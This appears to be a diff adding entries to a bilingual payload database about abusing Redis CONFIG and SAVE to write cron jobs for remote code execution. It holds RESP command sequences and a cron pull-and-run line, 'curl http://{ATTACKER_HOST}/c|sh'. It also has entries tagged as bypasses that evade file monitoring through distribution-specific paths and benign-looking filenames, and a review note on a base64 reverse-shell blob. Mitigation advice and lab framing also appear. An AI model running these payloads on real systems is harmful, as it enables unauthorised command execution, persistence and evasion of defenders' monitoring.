+            "en": "On Debian and Ubuntu the user crontab lives at /var/spool/cron/crontabs/root while most monitoring rules only watch the RHEL layout at /var/spool/cron/root, so switching dir lands the write inside a blind spot; that directory is managed by the crontab command and the dropped file must stay readable by cron. Success: crontabs/root contains the dropped content and the scheduled job fires."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/var/spool/cron/crontabs",
+              "explanation": {
+                "zh": "Debian/Ubuntu 用户 crontab 目录",
+                "en": "Debian/Ubuntu user crontab directory"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "CONFIG SET dbfilename root",
+              "explanation": {
+                "zh": "以用户名作为落盘文件名",
+                "en": "Drops under the username as filename"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        },
+        {
+          "title": {
+            "zh": "cron.d 合法命名落点规避",
+            "en": "cron.d Benign-Name Drop"
+          },
+          "command": "SET payload \"\\n*/3 * * * * root curl -fsS http://{ATTACKER_HOST}/c|sh\\n\"\\r\\nCONFIG SET dir /etc/cron.d\\r\\nCONFIG SET dbfilename sys-tmp-clean\\r\\nSAVE",
+          "description": {
+            "zh": "/etc/cron.d 由 cron 守护进程直接扫描，文件名需满足字母数字与连字符、下划线；以 sys-tmp-clean 这类看似运维脚本的合法命名落盘，绕过对 /var/spool/cron 路径与 root 文件名的监控规则，且 cron.d 行须带 user 字段（六段式）。命中判据：/etc/cron.d/sys-tmp-clean 生效并触发计划任务。",
+            "en": "The cron daemon scans /etc/cron.d directly and requires filenames made of alphanumerics, hyphens and underscores; dropping the file under a benign operations-style name such as sys-tmp-clean evades monitoring keyed on /var/spool/cron paths or the root filename, and cron.d lines must carry the user field in six-field form. Success: /etc/cron.d/sys-tmp-clean activates and the scheduled job fires."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "*/3 * * * * root",
+              "explanation": {
+                "zh": "六段式含 user 字段",
+                "en": "Six-field line with the user field"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "curl -fsS http://{ATTACKER_HOST}/c|sh",
+              "explanation": {
+                "zh": "回拉指令执行，无回连端口特征",
+                "en": "Pull-and-run instruction with no callback-port signature"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "CONFIG SET dir /etc/cron.d",
+              "explanation": {
+                "zh": "落盘目录指向 cron.d",
+                "en": "Drop directory set to cron.d"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认版本、权限与 Cron 路径",
+            "en": "Confirm version, privileges, and cron path"
+          },
+          "description": {
+            "zh": "在隔离副本确认 Redis CONFIG/SAVE 权限、运行账户写权限和目标发行版 Cron 文件规则。",
+            "en": "In an isolated copy, confirm Redis CONFIG and SAVE privileges, service-account write access, and the distribution's cron file rules."
+          }
+        },
+        {
+          "title": {
+            "zh": "发送证明型 RESP 序列",
+            "en": "Send the proof-only RESP sequence"
+          },
+          "description": {
+            "zh": "发送只写入 id 证明文件的完整序列，关联 Redis 命令日志、RDB 文件和 Cron 加载事件。",
+            "en": "Send the complete sequence that writes only an id proof file and correlate Redis command logs, the RDB file, and cron loading events."
+          },
+          "payload": "*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$3\\r\\ndir\\r\\n$15\\r\\n/var/spool/cron\\r\\n*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$4\\r\\nroot\\r\\n*3\\r\\n$3\\r\\nSET\\r\\n$4\\r\\ncron\\r\\n$52\\r\\n\\n*/1 * * * * bash -c 'id > /tmp/redis-cron-proof'\\n\\r\\n*1\\r\\n$4\\r\\nSAVE\\r\\n"
+        },
+        {
+          "title": {
+            "zh": "区分写文件与 Cron 执行",
+            "en": "Distinguish file write from cron execution"
+          },
+          "description": {
+            "zh": "只有 Cron 守护进程加载文件并生成证明文件才确认执行；单独出现 RDB 文件不算成功。",
+            "en": "Execution is confirmed only when the cron daemon loads the file and creates the proof file; an RDB file alone is insufficient."
+          }
+        },
+        {
+          "title": {
+            "zh": "恢复并验证控制措施",
+            "en": "Restore and validate controls"
+          },
+          "description": {
+            "zh": "删除测试 Cron/RDB/证明文件，恢复 dir 与 dbfilename，并验证 ACL、protected-mode 和文件权限。",
+            "en": "Remove test cron, RDB, and proof files, restore dir and dbfilename, and validate ACLs, protected mode, and filesystem permissions."
+          }
+        }
+      ],
+      "references": [
+        "https://redis.io/docs/latest/operate/oss_and_stack/management/security/"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "Redis 持久化配置写入 Cron 针对高权限 Redis 把持久化文件写入 Cron 读取位置的场景：依赖 CONFIG 权限、目录写权限、cron 格式与读取规则四类条件。验证 RESP 配置序列写入计划任务。",
+          "en": "Redis persistence-configuration-to-cron targets over-privileged Redis writing persistence files into cron-read locations: it depends on CONFIG permission, directory write access, cron format, and read rules. It validates the RESP configuration sequence writing a scheduled task."
+        },
+        "vulnerability": {
+          "zh": "当 Redis 暴露且以过高系统权限运行，攻击者可能修改持久化目录和文件名，把数据库快照写入计划任务位置；不同发行版的 cron 格式会显著影响可利用性，仅凭 SAVE 成功不能判定命令执行。",
+          "en": "When Redis is exposed and runs with excessive system privileges, attackers can change persistence directory and filename to write snapshots into scheduled-task locations; cron format varies significantly across distributions and strongly affects exploitability—SAVE success alone does not prove command execution."
+        },
+        "exploitation": {
+          "zh": "在可回滚实验副本上按第 1 步发送完整 RESP 序列：CONFIG SET dir 指向 cron 目录、dbfilename 设为 root，再 SET 写入含换行任务行的键并 SAVE；命中判据为 cron 服务按计划执行任务并在 /tmp/red… 留下输出。执行后立即恢复 dir/dbfilename 配置并清理任务文件；发行版 cron 格式不同时按实际布局调整路径并记录。",
+          "en": "On a rollback-capable experimental replica, send the full RESP sequence per step 1: CONFIG SET dir to the cron directory, dbfilename to root, SET a key containing the newline-framed task line, then SAVE; a hit is cron executing the task on schedule leaving output in /tmp/red…. Restore dir/dbfilename immediately afterwards and clean the task file; when distribution cron formats differ, adjust paths to the actual layout and record them."
+        },
+        "mitigation": {
+          "zh": "Redis ACL 禁止非管理主体调用 CONFIG 与持久化命令；以不可写系统计划任务目录的专用账户运行，启用 MAC/容器隔离，监控 dir/dbfilename 变化与 cron 目录写入。\n    [Service]\n    User=redis\n    NoNewPrivileges=yes\n    ProtectSystem=strict\n    ReadWritePaths=/var/lib/redis\n    # redis.conf ACL\n    user appuser on >StrongPass +@read +@write -@config -@dangerous",
+          "en": "Use Redis ACLs to block non-administrative principals from CONFIG and persistence commands; run Redis under a dedicated account that cannot write system task directories with MAC or container isolation; monitor dir/dbfilename changes, cron-directory writes, and anomalous scheduled tasks. After the fix, replay the step-1 sequence and confirm configuration changes are denied."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "拆分链阳性要求 Redis 审计确认测试文件落入专用 cron 目录，且调度器日志显示固定任务以预期低权限 UID 执行并生成 canary。CONFIG 返回 OK、SAVE 产生文件、cron 文件语法无效、任务未触发、网络连接来自其他进程或只有 Redis 键值都不是计划执行证据。",
+        "en": "Positive evidence for the split chain requires Redis auditing to confirm a test file in the dedicated cron directory and scheduler logs to show the fixed task running once under the expected low-privilege UID and creating the canary. CONFIG returning OK, SAVE creating a file, invalid cron syntax, a task that never runs, a network connection from another process, or only a Redis value is not scheduled-execution evidence."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF2 批次3：按报告 WAF2-0061 补齐空 wafBypass——base64 化 cron 指令行、用户 crontab 目录切换（报告候选全文）与 /etc/cron.d 合法命名落点（按 cron 落盘文件名规避技术语境自造），语义标注为检测规避，共 3 条。披露一处报告笔误修正：候选 blob 原文解码为 ATTACKER_HOSL（HOST 拼写笔误），已改用解码严格等于 bash -i 加 {ATTACKER_HOST}/{LPORT} 回连串的修正 blob，与描述一致；本载荷为 payloadSplit 源，execution 不在应用字段内，wafBypass 走全条目通道安全，镜像 dump 现状后只追加末尾。"
+      }
+    }
+  ]
+}
